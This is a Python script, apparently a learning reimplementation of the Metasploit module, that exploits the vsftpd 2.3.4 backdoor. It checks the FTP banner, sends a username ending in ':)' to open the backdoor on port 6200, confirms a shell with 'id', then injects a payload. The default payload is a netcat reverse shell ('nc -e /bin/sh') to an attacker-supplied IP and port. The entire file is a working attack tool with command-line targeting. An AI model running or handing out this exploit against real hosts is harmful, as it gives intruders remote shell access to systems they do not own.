# Rewriting the Metaexploit method
import argparse
import re
import socket
import sys

# checking the FTP service to make sure is vulnerable
def check_service_version(conn):
    print("Checking Service version")
    # banner grabbing
    banner_data = conn.recv(1024)
    banner = banner_data.decode().strip()
    print("Banner: {}".format(banner))
    # making banner comparison
    if banner.lower() != "220 (vsftpd 2.3.4)":
        return False
    return True

# send the params to the FTP server that will open the backdoor port
def open_backdoor(conn):
    print("Opening backdoor")
    # sending bytes - abc123:) as the user
    sent_bytes = conn.send('USER david:)\r\n'.encode())
    # receiving the response
    response = conn.recv(1024)
    password_response = response.decode().strip()
    password_response_code = int(password_response.split()[0])
    if password_response_code != 331:
        return False
    # if matches we send a plain password to open the backdoor
    sent_bytes = conn.send('PASS \r\n'. encode())
    return True

# inject the payload to the backdoor connection - sending a reverse shell
def inject_payload(conn, payload):
    print("Injecting payload via Backdoor")
    # sending 'id' command to the backdoor
    sent_bytes = conn.send('id\n'. encode())
    response = conn.recv(1024)
    # getting the current ID of the infected machine
    uid_data = response.decode().strip()
    if re.search(r'^uid=', uid_data):
        uid = uid_data.split('(')[1].split(')')[0]
        #
        print("Got shell as user {}!".format(uid))
        # now, we send a simple reverse shell from the exploited server to the attacking hot
        print("Injecting and running payload")
        # passing payload string
        send_bytes = conn.send('nohup {} >/dev/null 2>&1 \n'.format(payload).encode())
        return True
    else:
        print(uid_data)
        return False

# a simple tcp socket connection for specific target and port
def init_tcp_conn(target, port):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((target,port))
    return conn

# a simple backdoor connection for specific target and port
def init_backdoor_conn(target):
    return init_tcp_conn(target, 6200)

# performs a TCP connection
def init_ftp_conn(target):
    return init_tcp_conn(target,21)

def main():
    # provider CLI and scope functionality
    parser = argparse.ArgumentParser(description="A Python version of the Metasploit exploit for vsftpd version 2.3.4")
    parser.add_argument("-i", "--inject", help="Custom payload to inject upon successful exploit")
    parser.add_argument("-r", "--revshell-ip", help="Target IP for reverse shell to connect back to upon sucessful exploit")
    parser.add_argument("-p", "--revshell-port", default=4444, help="Target port for reverse shell to connect back to upon sucessful exploit (default=4444)")
    parser.add_argument("target_host", help="Target for exploit")
    # args parser
    args = parser.parse_args()

    # initialize variables
    target = args.target_host
    revshell_ip = args.revshell_ip
    revshell_port = int(args.revshell_port)
    payload = args.inject

    # defining IP validation
    if not payload and not revshell_ip:
        print('ERROR: must define either a reverse shell target IP or a custom payload')
        sys.exit(1)
    if not payload:
        payload = 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)

    # performing connection
    conn = init_ftp_conn(target)
    # check if service version matches to the vuln one
    if not check_service_version(conn):
        print('ERROR: This is not a vsftpd server on version 2.3.4, so this exploit will not work. Exiting')
        sys.exit(100)
    # validating open backdoor
    if not open_backdoor(conn):
        print('ERROR: The server did not respond as expected. Exiting')
        sys.exit(101)
    # opening backdoor
    backdoor_conn = init_backdoor_conn(target)
    # injecting payload
    if inject_payload(backdoor_conn, payload):
        print("Exploit successful")
    else:
        print('ERROR: Did not gain shell, Exploit failed')
    # clean up
    print('Closing connection to the server')
    backdoor_conn.close()
    conn.close()
    print('Exploit complete')

if __name__ == "__main__":
    main()
